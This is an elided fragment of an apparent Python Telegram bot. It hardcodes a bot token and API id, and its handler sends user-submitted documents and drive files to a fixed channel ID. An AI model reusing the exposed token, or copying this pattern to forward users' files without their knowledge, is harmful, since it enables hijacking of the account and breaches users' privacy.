...
bot = Client("bot",
             bot_token= "6458939607:AAFoGSkcqvfS7W4F1_o0jjbAH-Vx_qWkBSI",
             api_id= 4410228,
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1001841872891, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1001841872891)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
